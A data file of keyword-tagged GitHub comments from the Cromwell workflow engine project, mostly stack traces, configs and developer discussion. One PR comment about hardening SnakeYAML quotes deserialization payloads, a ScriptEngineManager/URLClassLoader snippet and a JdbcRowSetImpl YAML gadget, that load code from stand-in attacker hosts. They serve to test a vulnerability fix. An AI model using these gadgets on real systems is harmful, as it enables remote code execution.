sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClient,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8359,secur,security,8359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localCopy:; disk: local-disk; path: exec.sh; name: exec; name: CallingGroup_Workflow; outputParameters:; - localCopy:; disk: local-disk; path: VEP_Task-rc.txt; name: VEP_Task-rc.txt; - localCopy:; disk: local-disk; path: dstat.log.txt; name: dstat.log.txt; - localCopy:; disk: local-disk; path: df.log.txt; name: df.log.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt; name: variant_effect_output.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt_summary.html; name: variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 10; disks:; - mountPoint: /cromwell_root; name: local-disk; sizeGb: 31; type: PERSISTENT_HDD; minimumCpuCores: 1; minimumRamGb: 7; zones:; - us-central1-b; - us-central1-c; - us-central1-f; pipelineArgs:; clientId: ''; inputs:; VEP_File-0: gs://firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; __extra_config_gcs_path: gs://cromwell-auth-broad-firecloud-benchmark/04b3f189-18f3-47b3-972c-0e59d2a56174_auth.json; exec: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/exec.sh; mutectMergedRawVCF-0: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; labels: {}; logging:; gcsPath: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task.log; outputs:; VEP_Task-rc.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a8888400,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:3763,access,access,3763,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['access'],['access']
Security,": ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `gpu_count >= 1` workflow run successfully. . Desired behaviour : `gpu_count = 0` runs to completion, without being assigned a gpu from the backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1618,validat,validation,1618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757,3,"['Validat', 'validat']","['ValidatedRuntimeAttributesBuilder', 'validation']"
Security,":+1: . So sad, i'm always seeking validation :'(. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1427/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1427#issuecomment-247640697:34,validat,validation,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1427#issuecomment-247640697,1,['validat'],['validation']
Security,":+1: minding Chris comment that ""not a real value"" as an encryption key might break cromwell. So either wait for devops to put the real key before merging or change it to some dummy `""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=""`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171465923:57,encrypt,encryption,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171465923,1,['encrypt'],['encryption']
Security,":+1: these were removed for non-technical reasons which are no longer an issue. Note to implementer (here and #2651) - keep in mind that we very intentionally don't process workflows (including validation) synchronously for submission so we should be careful here as well. One thought would be to put this (and the inputs functionality in #2651) in something behind the service registry. The default impl could process the request the way one would expect, but in something like CaaS the requests could be farmed out to another microservice or something like that. . Either way, we're also doing validation in MWDA, we should make sure it's being done the same as here",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2652#issuecomment-331680557:194,validat,validation,194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2652#issuecomment-331680557,2,['validat'],['validation']
Security,":1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketI",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7463,secur,security,7463,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,":973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHtt",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7897,secur,security,7897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,; 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomBundleMakers$$anon$1.toWomBundle(WdlDraft2WomBundleMakers.scala:19); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomBundleMakers$$anon$1.toWomBundle(WdlDraft2WomBundleMakers.scala:17); 	at wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); 	at wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); 	at wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); 	at languages.wdl.draft2.WdlDraft2LanguageFactory.$anonfun$getWomBundle$3(WdlDraft2LanguageFactory.scala:120); 	at scala.util.Either.flatMap(Either.scala:338); 	at languages.wdl.draft2.WdlDraft2LanguageFactory.$anonfun$getWomBundle$1(WdlDraft2LanguageFactory.scala:119); 	at scala.util.Either.flatMap(Either.scala:338); 	at languages.wdl.draft2.WdlDraft2LanguageFactory.getWomBundle(WdlDraft2LanguageFactory.scala:118); 	at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:49); 	at scala.util.Either.flatMap(Either.scala:338); 	at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:40); 	at womtool.input.WomGraphMaker$.getBundle(WomGraphMaker.scala:22); 	at womtool.validate.Validate$.validate(Validate.scala:14); 	at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:47); 	at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:134); 	at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:139); 	at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:21); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at womtool.WomtoolMain$.main(WomtoolMain.scala:21); 	at womtool.WomtoolMain.main(WomtoolMain.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:8999,validat,validate,8999,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,4,"['Validat', 'validat']","['Validate', 'validate']"
Security,; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpReques,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8196,secur,security,8196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"=$?; if [ \""$RC_GSUTIL\"" = \""1\"" ]; then\n grep \""Bucket is requester pays bucket but no user project provided.\"" gsutil_output.txt && echo \""Retrying with user project\""; gsutil -u bioinfo-prod -h \""Content-Type: text/plain; charset=UTF-8\"" cp /cromwell_root/stdout gs://temporary-files/PET508-001/workspace/SingleSampleGenotyping/b67b285a-1f63-4514-b472-8618f1082470/call-ubam2bam/from_ubam.to_bam_workflow/4306b863-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-BaseRecalibrator/shard-9/; fi ; RC=$?; if [ \""$RC\"" = \""0\"" ]; then break; fi; sleep 5; done; return \""$RC\""; }; retry"": Copying file: ///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. ""; }],; message: ""Workflow failed""; }],; message: ""Workflow failed""; }; ],; ```. This step is executed in a scatter way, 17x per analysis (distinct genomic interval for each shard). Bellow follows the cromwell script of the shard that processed chromosome 12 and 13:. ```bash; #!/bin/bash. cd /cromwell_root; tmpDir=$(mkdir -p ""/cromwell_root/tmp.a7701249"" && echo ""/cromwell_root/tmp.a7701249""); chmod 777 ""$tmpDir""; export _JAVA_OPTIONS=-Djava.io.tmpdir=""$tmpDir""; export TMPDIR=""$tmpDir""; export HOME=""$HOME""; (; cd /cromwell_root. ); oute4a6eeab=""${tmpDir}/out.$$"" erre4a6eeab=""${tmpDir}/err.$$""; mkfifo ""$oute4a6eeab"" ""$erre4a6eeab""; trap 'rm ""$oute4a6eeab"" ""$erre4a6eeab""' EXIT; tee '/cromwell_root/stdout' < ""$oute4a6eeab"" &; tee '/cromwell_root/stderr' < ""$erre4a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865:1937,access,access,1937,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"> 1. It looks like the perf tests were run on version `""cromwellVersion"": ""48-e0cee74-SNAP"",`, but I don't see that hash in the commit history here.; > ; > I just want to check that was the version you were expecting them to run against, since I would expect it to be a `49-...` hash (you presumably had to rebase onto develop to undo all of the not-quite-summarizer-fix changes)?. @cjllanwarne this is the proper version. I actually took your initial `cjl_summarization_queue` branch and made updates in it. Then I built it locally and pushed to my personal Dockerhub.; I only merged develop branch into this one before creating the PR. >I think we could make this process more efficient by only writing the IDs into the summary queue in the first place if we know we'll actually want to summarize them later on. Do you mean write only those IDs which have certain metadata key value? I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436:116,hash,hash,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436,4,['hash'],['hash']
Security,"> > I have the same problem. Have you solved it?; > ; > I think it might be a bogus warning? My container seems to run correctly. Since I was using a Singularity image file, I couldn't get a Docker-hash, which resulted in call-cache not working. This is the key issue. Isn't the main reason we use server mode for call-cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504:198,hash,hash,198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504,1,['hash'],['hash']
Security,"> Alternatively, maybe the AWS Batch role doesn't have read access to the S3 bucket? The Cromwell server and the Batch instances are different. Here's the IAM S3 Policy for the Genomics Batch EC2 role `GenomicsEnv-Batch-IamStac-GenomicsEnvBatchInstance-16INP51KVS4TZ`. ```; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Action"": [; ""s3:*""; ],; ""Resource"": [; ""arn:aws:s3:::concr-genomics-results"",; ""arn:aws:s3:::concr-genomics-results/*""; ],; ""Effect"": ""Allow"",; ""Sid"": ""S3BucketAllowAllObjectOps""; }; ]; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435018864:60,access,access,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435018864,1,['access'],['access']
Security,"> Another option would be to set your VPC configuration to allow access to GCR from inside it. That might be useful in any case since the workflows you run might want to import tools based in external GCR locations.; > ; > I suspect you might need to allow your VPC to access other google services as well anyway - to allow it to access PAPI for example?. Thats not usable option for us. That would allow unaudited containers in our system and we cannot allow that. ; We have own container registry inside vpc and add required containers there after audit. vpc service control (https://cloud.google.com/vpc-service-controls) allows us select witch google services are usable and which are not. Basically this hardcoded container is only problem with our excisting environment. And because of that, we need to build own custom version of Cromwell (and update it), instead of just changing it in config. And it seems that we aren't only ones with same problem (based by comment in jira ticket).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5586#issuecomment-662704167:65,access,access,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5586#issuecomment-662704167,8,"['access', 'audit']","['access', 'audit']"
Security,"> Engine support:. For streaming to/from the data storage system, the Arvados Keep data system means that the Arvados Crunch workflow manager doesn't have to wait for input files to be staged (copied) in. The Arvados Keep FUSE plugin only downloads data as the tool requests access to a particular offset. I don't think they co-schedule tasks (either on the same system or ""nearby"" nodes) for direct streaming yet",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-860446694:275,access,access,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-860446694,1,['access'],['access']
Security,"> I am having the same error with the example ""Using Data on S3"" on https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-examples/ . I have changed the S3 bucket name in the .json file to my bucket name, but the run still failed. After reporting running failure, I have got the same error message. I am using cromwell-48. The S3 bucket has all public access, and I was logged in as the Admin in two terminal windows, one running the server and the other submitting the job. The previous two hello-world example were successful. There is no log file in the bucket and in the cromwell-execution, the only file create was the script. There is no rc or stderr or stdout created. @blindmouse Were you able to resolve your issue? I am encountering the same problem. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-662080275:375,access,access,375,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-662080275,1,['access'],['access']
Security,"> I recommend using the call cache diff endpoint; > ; > ```; > GET ​/api​/workflows​/v1/callcaching​/diff; > ```; > ; > > This endpoint returns the hash differences between 2 completed (successfully or not) calls. Thank you, i will try it",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881:148,hash,hash,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881,1,['hash'],['hash']
Security,"> I'm trying to figure out how to get [travis?] to redo the travis build. Yeah, PRs 1333 and this 1334 currently have the same git hash. Try updating to a new git hash by ""touching"" the commit, and then force pushing:. ``` bash; git checkout jg_haircut_for_testkitspec && \; git commit --amend -C HEAD --date=now && \; git push -f origin HEAD; ```. NOTE: Add `-q` after each `git <command>` to quiet down the output.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1334#issuecomment-242259156:131,hash,hash,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1334#issuecomment-242259156,2,['hash'],['hash']
Security,"> Is this because Pipelines API version 1 does not support buckets with requester pays? If so, why cannot Cromwell just say so?. Granted it's not in the error message itself, but the [page I linked](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) states. > Pipelines API version 1 does not support buckets with requester pays, so while Cromwell itself might be able to access bucket with RP, jobs running on Pipelines API V1 with file inputs and / or outputs will not work. Pipelines API v1 is deprecated by Google and documentation for it is not maintained; new projects should always use v2. ---. As for the `gcloud` issue I've never done this particular operation personally, but I suspect you may have luck looking at the GCP docs or Stack Overflow. You could opt for [Terra](https://app.terra.bio/) which is basically a fully managed version of Cromwell (it configures Cromwell and all of this project stuff for you). Hope this helps.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665264424:411,access,access,411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665264424,1,['access'],['access']
Security,"> Is this run on all jobs? If so Is it potentially something a user would want to turn off?. Yes, it runs on all jobs by default. I'm not sure if users would explicitly want to turn it off, since it doesn't interfere with anything as far as I can tell, and the pricing issue is virtually non-existent. > Also did you produce that graph manually? Is there a way to generate it easily for a workflow?. Yep, the graph can be easily produced through Stackdriver monitoring console with a few clicks, or a link to it can be constructed programmatically and exposed to the user. The graph is interactive, so there's no need to ""pre-render"" it - it is constructed dynamically by the monitoring console, based on user inputs and/or the link. > Can you include your monitor python/image code in this PR? Would be easier to maintain that way. Sure! Is there a folder path you'd prefer to keep it at? Perhaps I could put it under `supportedBackends/google/pipelines/v2alpha1/src/monitoring`?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451492862:552,expose,exposed,552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451492862,1,['expose'],['exposed']
Security,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:974,attack,attacker,974,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331,1,['attack'],['attacker']
Security,"> Just a couple of questions about using `flatMetadata` at all (eg we have a way of comparing the real json results directly, why go through all that indirection which may or may not do the right thing?). I kinda like the concept of more DSL-ish validation with flat metadata, as opposed to comparison of raw jsons. But probably it's excessive here indeed, so I removed the `compareFlatMetadata`. method.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5436#issuecomment-595402100:246,validat,validation,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5436#issuecomment-595402100,1,['validat'],['validation']
